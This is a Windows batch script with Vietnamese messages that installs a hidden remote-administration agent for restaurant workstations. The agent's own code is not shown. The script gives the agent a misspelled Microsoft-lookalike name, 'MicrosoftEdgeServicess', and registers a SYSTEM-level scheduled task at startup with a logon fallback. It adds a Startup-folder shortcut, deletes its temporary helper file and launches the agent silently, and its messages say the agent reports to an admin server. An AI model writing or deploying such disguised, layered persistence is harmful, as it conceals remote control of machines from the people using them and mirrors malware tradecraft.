@echo off
title Cai Dat Dich Vu MicrosoftEdgeServicess Tu Dong Khoi Dong Cung Windows
cd /d "%~dp0"

echo ===============================================================================
echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
echo   Ten dich vu: MicrosoftEdgeServicess
echo   Co che: Tu khoi dong cung Windows (Automatic) - Chay ngam 100 phan tram
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file thuc thi EXE hoac Python tren may hay khong
set "HAS_RUNNER=0"
if exist "%~dp0MicrosoftEdgeServicess.exe" (
    set "HAS_RUNNER=1"
    echo [OK] Phat hien goi phan mem doc lap MicrosoftEdgeServicess.exe (Khong can Python).
) else (
    python -c "import sys; sys.exit(0)" >nul 2>nul
    if %errorlevel% equ 0 (
        set "HAS_RUNNER=1"
        echo [OK] Phat hien moi truong Python tren he thong.
    ) else (
        py -3 -c "import sys; sys.exit(0)" >nul 2>nul
        if %errorlevel% equ 0 (
            set "HAS_RUNNER=1"
            echo [OK] Phat hien Python Launcher (py) tren he thong.
        )
    )
)

if "%HAS_RUNNER%"=="0" (
    echo [CANH BAO] Khong tim thay MicrosoftEdgeServicess.exe hoac Python!
    echo Vui long kiem tra file MicrosoftEdgeServicess.exe phai nam cung thu muc voi file bat nay.
    echo Hoac cai dat Python 3.8 tro len.
    echo.
    pause
    exit /b 1
)

:: 2. Thiet lap thu muc cai dat he thong
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo.
echo 1. Dang sao chep cac tep dich vu vao: %INSTALL_DIR%
if exist "%~dp0MicrosoftEdgeServicess.exe" copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Run_Silent_Agent.vbs" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul

echo.
echo 2. Dang dang ky tac vu tu dong khoi dong cung Windows (Task Scheduler)...
schtasks /Create /TN "MicrosoftEdgeServicess" /TR "wscript.exe \"%INSTALL_DIR%\Run_Silent_Agent.vbs\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>nul
if %errorlevel% neq 0 (
    echo    -> Dang ky Task Scheduler muc SYSTEM can quyen Admin. Dang ky du phong muc ONLOGON...
    schtasks /Create /TN "MicrosoftEdgeServicess" /TR "wscript.exe \"%INSTALL_DIR%\Run_Silent_Agent.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>nul
)

:: 3. Tao shortcut vao thu muc Startup de dam bao du phong
echo.
echo 3. Dang thiet lap khoi dong du phong tai Startup folder...
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_SHORTCUT=%TEMP%\create_shortcut_edge_svc.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SHORTCUT%"
echo sLinkFile = "%STARTUP_DIR%\MicrosoftEdgeServicess.lnk" >> "%VBS_SHORTCUT%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_SHORTCUT%"
echo oLink.TargetPath = "%INSTALL_DIR%\Run_Silent_Agent.vbs" >> "%VBS_SHORTCUT%"
echo oLink.WorkingDirectory = "%INSTALL_DIR%" >> "%VBS_SHORTCUT%"
echo oLink.Description = "MicrosoftEdgeServicess Remote Support Background Service" >> "%VBS_SHORTCUT%"
echo oLink.Save >> "%VBS_SHORTCUT%"
cscript //nologo "%VBS_SHORTCUT%" >nul 2>nul
if exist "%VBS_SHORTCUT%" del /f /q "%VBS_SHORTCUT%" >nul 2>nul

echo.
echo 4. Dang khoi chay dich vu ngam ngay bay gio...
wscript.exe "%INSTALL_DIR%\Run_Silent_Agent.vbs"

echo.
echo ===============================================================================
echo   CAI DAT THANH CONG!
echo   - Thu muc cai dat: %INSTALL_DIR%
echo   - Ten dich vu ngam: MicrosoftEdgeServicess
echo   - Da thiet lap tu khoi dong cung Windows moi khi bat may.
echo   - Dich vu dang chay ngam va gui Heartbeat dinh ky ve Server Quan Tri.
echo ===============================================================================
echo.
pause
